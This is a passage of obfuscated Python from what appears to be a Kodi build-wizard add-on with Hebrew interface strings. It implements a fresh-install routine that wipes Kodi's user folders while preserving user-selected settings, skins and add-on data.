		EXCLUDES .append ('skin.estuary')#line:5300
		if KEEPWHITELIST =='true':#line:5303
			OOOOO0000OOOOO000 =''#line:5304
			OO00000OO0O0000OO =wiz .whiteList ('read')#line:5305
			if len (OO00000OO0O0000OO )>0 :#line:5306
				for O0OOO0OO0000OO0OO in OO00000OO0O0000OO :#line:5307
					try :O0OO0O000000000O0 ,O00000OOO00000O00 ,OO00O0O00O0O0000O =O0OOO0OO0000OO0OO #line:5308
					except :pass #line:5309
					if OO00O0O00O0O0000O .startswith ('pvr'):OOOOO0000OOOOO000 =O00000OOO00000O00 #line:5310
					OO0OO0OO000OOOO0O =dependsList (OO00O0O00O0O0000O )#line:5311
					for OO0O00O0OOOOOO0O0 in OO0OO0OO000OOOO0O :#line:5312
						if not OO0O00O0OOOOOO0O0 in EXCLUDES :#line:5313
							EXCLUDES .append (OO0O00O0OOOOOO0O0 )#line:5314
						OOOO0O0O0OO0O00O0 =dependsList (OO0O00O0OOOOOO0O0 )#line:5315
						for OO00OOOO00OOOO0OO in OOOO0O0O0OO0O00O0 :#line:5316
							if not OO00OOOO00OOOO0OO in EXCLUDES :#line:5317
								EXCLUDES .append (OO00OOOO00OOOO0OO )#line:5318
					if not OO00O0O00O0O0000O in EXCLUDES :#line:5319
						EXCLUDES .append (OO00O0O00O0O0000O )#line:5320
				if not OOOOO0000OOOOO000 =='':wiz .setS ('pvrclient',OO00O0O00O0O0000O )#line:5321
		if wiz .getS ('pvrclient')=='':#line:5322
			for O0OOO0OO0000OO0OO in EXCLUDES :#line:5323
				if O0OOO0OO0000OO0OO .startswith ('pvr'):#line:5324
					wiz .setS ('pvrclient',O0OOO0OO0000OO0OO )#line:5325
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5326
		OO0O0000O0O0OOO0O =wiz .latestDB ('Addons')#line:5327
		for O00O0O00OO00OOOO0 ,O0OO0OO0OOOOO0000 ,OOOOOOOO0000OOOOO in os .walk (OOOOO0OOOOOOOOOOO ,topdown =True ):#line:5328
			O0OO0OO0OOOOO0000 [:]=[OOOO0O0OOOOO00OO0 for OOOO0O0OOOOO00OO0 in O0OO0OO0OOOOO0000 if OOOO0O0OOOOO00OO0 not in EXCLUDES ]#line:5329
			for O0OO0O000000000O0 in OOOOOOOO0000OOOOO :#line:5330
				O0OO000O0OOO0OO0O +=1 #line:5331
				OO00O0O00O0O0000O =O00O0O00OO00OOOO0 .replace ('/','\\').split ('\\')#line:5332
				O0OOO000OOOOOO0OO =len (OO00O0O00O0O0000O )-1 #line:5334
				if OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5335
				elif O0OO0O000000000O0 =='MyVideos99.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5336
				elif O0OO0O000000000O0 =='MyVideos107.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5337
				elif O0OO0O000000000O0 =='MyVideos116.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5338
				elif O0OO0O000000000O0 =='MyVideos99.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5339
				elif O0OO0O000000000O0 =='MyVideos107.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5340
				elif O0OO0O000000000O0 =='MyVideos116.db'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5341
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5342
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'skin.anonymous.mod'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5343
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'skin.Premium.mod'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5344
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'skin.anonymous.nox'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5345
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'skin.phenomenal'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5346
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5347
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'skin.titan'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5349
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5350
				elif O0OO0O000000000O0 =='sources.xml'and OO00O0O00O0O0000O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5352
				elif O0OO0O000000000O0 =='quicknav.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5355
				elif O0OO0O000000000O0 =='x1101.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5356
				elif O0OO0O000000000O0 =='b-srtym-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5357
				elif O0OO0O000000000O0 =='x1102.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5358
				elif O0OO0O000000000O0 =='b-sdrvt-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5359
				elif O0OO0O000000000O0 =='x1112.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5360
				elif O0OO0O000000000O0 =='b-tlvvyzyh-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5361
				elif O0OO0O000000000O0 =='x1111.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5362
				elif O0OO0O000000000O0 =='b-tvknyshrly-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5363
				elif O0OO0O000000000O0 =='x1110.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5364
				elif O0OO0O000000000O0 =='b-yldym-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5365
				elif O0OO0O000000000O0 =='x1114.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5366
				elif O0OO0O000000000O0 =='b-mvzyqh-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5367
				elif O0OO0O000000000O0 =='mainmenu.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5368
				elif O0OO0O000000000O0 =='skin.Premium.mod.properties'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5369
				elif O0OO0O000000000O0 =='x1122.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5371
				elif O0OO0O000000000O0 =='b-spvrt-b.DATA.xml'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5372
				elif O0OO0O000000000O0 =='favourites.xml'and OO00O0O00O0O0000O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5377
				elif O0OO0O000000000O0 =='guisettings.xml'and OO00O0O00O0O0000O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5379
				elif O0OO0O000000000O0 =='profiles.xml'and OO00O0O00O0O0000O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5380
				elif O0OO0O000000000O0 =='advancedsettings.xml'and OO00O0O00O0O0000O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5381
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5382
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'program.apollo'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5383
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5384
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.telemedia'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5385
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.elementum'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5388
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5390
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'weather.yahoo'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5391
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.quasar'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5392
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'program.apollo'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5393
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5394
				elif OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -2 ]=='userdata'and OO00O0O00O0O0000O [O0OOO000OOOOOO0OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO00O0O00O0O0000O [O0OOO000OOOOOO0OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5395
				elif O0OO0O000000000O0 in LOGFILES :wiz .log ("Keep Log File: %s"%O0OO0O000000000O0 ,xbmc .LOGNOTICE )#line:5396
				elif O0OO0O000000000O0 .endswith ('.db'):#line:5397
					try :#line:5398
						if O0OO0O000000000O0 ==OO0O0000O0O0OOO0O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OO0O000000000O0 ,KODIV ),xbmc .LOGNOTICE )#line:5399
						else :os .remove (os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ))#line:5400
					except Exception as O0O000O00OO00O00O :#line:5401
						if not O0OO0O000000000O0 .startswith ('Textures13'):#line:5402
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5403
							wiz .log ("-> %s"%(str (O0O000O00OO00O00O )),xbmc .LOGNOTICE )#line:5404
							wiz .purgeDb (os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ))#line:5405
				else :#line:5406
					DP .update (int (wiz .percentage (O0OO000O0OOO0OO0O ,OO000OOOOO0O0OO0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O000000000O0 ),'')#line:5407
					try :os .remove (os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ))#line:5408
					except Exception as O0O000O00OO00O00O :#line:5409
						wiz .log ("Error removing %s"%os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),xbmc .LOGNOTICE )#line:5410
						wiz .log ("-> / %s"%(str (O0O000O00OO00O00O )),xbmc .LOGNOTICE )#line:5411
			if DP .iscanceled ():#line:5412
				DP .close ()#line:5413
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5414
				return False #line:5415
		for O00O0O00OO00OOOO0 ,O0OO0OO0OOOOO0000 ,OOOOOOOO0000OOOOO in os .walk (OOOOO0OOOOOOOOOOO ,topdown =True ):#line:5416
			O0OO0OO0OOOOO0000 [:]=[OOO000OOOO00O0OO0 for OOO000OOOO00O0OO0 in O0OO0OO0OOOOO0000 if OOO000OOOO00O0OO0 not in EXCLUDES ]#line:5417
			for O0OO0O000000000O0 in O0OO0OO0OOOOO0000 :#line:5418
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O000000000O0 ),'')#line:5419
			  if O0OO0O000000000O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5420
			   if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5421
			    if not (O0OO0O000000000O0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5423
			      if not (O0OO0O000000000O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5424
			       if not (O0OO0O000000000O0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5425
			        if not (O0OO0O000000000O0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5426
			         if not (O0OO0O000000000O0 =='program.apollo'and KEEPINFO =='true'):#line:5427
			          if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5428
			           if not (O0OO0O000000000O0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5429
			            if not (O0OO0O000000000O0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5430
			             if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5431
			              if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5432
			               if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5433
			                if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5434
			                 if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5435
			                  if not (O0OO0O000000000O0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5436
			                   if not (O0OO0O000000000O0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5437
			                    if not (O0OO0O000000000O0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5438
			                     if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5439
			                      if not (O0OO0O000000000O0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5440
			                       if not (O0OO0O000000000O0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5441
			                           if not (O0OO0O000000000O0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5445
			                            if not (O0OO0O000000000O0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5446
			                             if not (O0OO0O000000000O0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5447
			                              if not (O0OO0O000000000O0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5448
			                               if not (O0OO0O000000000O0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5449
			                                  shutil .rmtree (os .path .join (O00O0O00OO00OOOO0 ,O0OO0O000000000O0 ),ignore_errors =True ,onerror =None )#line:5451
			if DP .iscanceled ():#line:5452
				DP .close ()#line:5453
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5454
				return False #line:5455
		DP .close ()#line:5456
		wiz .clearS ('build')#line:5457
		if over ==True :#line:5458
			return True #line:5459
		elif install =='restore':#line:5460
			return True #line:5461
		elif install :#line:5462
			buildWizard (install ,'normal',over =True )#line:5463
		else :#line:5464
			if INSTALLMETHOD ==1 :O0O0OO00000O000O0 =1 #line:5465
			elif INSTALLMETHOD ==2 :O0O0OO00000O000O0 =0 #line:5466
